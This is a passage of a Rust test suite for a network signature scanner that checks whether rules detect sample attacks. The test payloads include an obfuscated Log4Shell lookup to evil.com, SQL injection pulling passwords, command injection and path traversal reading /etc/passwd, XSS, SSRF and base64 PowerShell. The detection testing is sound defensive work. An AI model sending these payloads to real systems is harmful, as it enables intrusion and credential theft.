        // Clean HELO should produce no matches
        assert!(matches.is_empty(), "Clean HELO must not match any signature");
    }

    #[test]
    fn test_multiple_matches() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"VRFY admin\r\nEXPN all-users\r\n";
        let matches = set.scan(payload);
        assert!(matches.len() >= 2);
    }

    // ── Regex-based signature tests ──

    #[test]
    fn test_regex_obfuscated_log4shell() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /?q=${j${::-n}di:ldap://evil.com/x} HTTP/1.1\r\n";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000090),
            "Obfuscated Log4Shell should be caught by regex (SID 2000090): {:?}", matches
        );
    }

    #[test]
    fn test_regex_sql_injection_union() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /search?q=1' UNION ALL SELECT username,password FROM users-- HTTP/1.1";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000091),
            "UNION SELECT SQLi should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_command_injection() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"POST /api HTTP/1.1\r\n\r\nhost=; cat /etc/passwd";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000092),
            "Command injection should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_xss_event_handler() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"<img src=x onerror=alert(1)>";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000095),
            "XSS event handler should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_double_extension_attachment() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"Content-Disposition: attachment; filename=\"invoice.pdf.exe\"";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000096),
            "Double extension should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_path_traversal() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /../../../../etc/passwd HTTP/1.1";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000094),
            "Path traversal should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_ssrf_localhost() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /proxy?url=http://127.0.0.1:8080/admin HTTP/1.1";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000097),
            "SSRF to localhost should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_hybrid_signature_base64_powershell() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // Must have BOTH the content pattern AND regex to fire
        let payload = b"Content-Transfer-Encoding: base64\r\n\r\ncG93ZXJzaGVsbA==";
        let matches = set.scan(payload);
        assert!(
            matches.iter().any(|m| m.sid == 2000093),
            "Base64 PowerShell hybrid should match: {:?}", matches
        );
    }

    #[test]
    fn test_regex_hybrid_no_content_pattern_no_fire() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // Regex matches but content pattern doesn't — should NOT fire
        let payload = b"some data cG93ZXJzaGVsbA here but no base64 header";
        let matches = set.scan(payload);
        assert!(
            !matches.iter().any(|m| m.sid == 2000093),
            "Hybrid sig should NOT fire without content pattern"
        );
    }

    #[test]
    fn test_regex_clean_payload_no_match() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /api/users?page=1 HTTP/1.1\r\nHost: example.com\r\n";
        let matches = set.scan(payload);
        // Clean request should not trigger regex sigs
        let regex_sids: Vec<u32> = matches.iter().map(|m| m.sid).filter(|s| *s >= 2000090).collect();
        assert!(regex_sids.is_empty(), "Clean payload triggered regex sigs: {:?}", regex_sids);
    }

    #[test]
    fn test_regex_only_signature_compilation() {
        // Verify that a regex-only signature (no content_patterns) compiles and works
        let sig = Signature {
            sid: 9999999,
            rev: 1,
            message: "Test regex-only sig".into(),
            content_patterns: vec![],
            regex_patterns: vec![r#"\d{3}-\d{2}-\d{4}"#.into()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Info,
            category: "test".into(),
            protocol: "any".into(),
            references: vec![],
        };
        let set = SignatureSet::new(vec![sig]).expect("compile regex sig");
        let matches = set.scan(b"SSN: 123-45-6789");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].sid, 9999999);
    }

    #[test]
    fn test_invalid_regex_rejected() {
        let sig = Signature {
            sid: 8888888,
            rev: 1,
            message: "Bad regex".into(),
            content_patterns: vec![],
            regex_patterns: vec![r#"(?P<open"#.into()], // invalid regex
            action: SignatureAction::Alert,
            severity: SigSeverity::Info,
            category: "test".into(),
            protocol: "any".into(),
            references: vec![],
        };
        let result = SignatureSet::new(vec![sig]);
        assert!(result.is_err(), "Invalid regex should cause compilation error");
    }
}
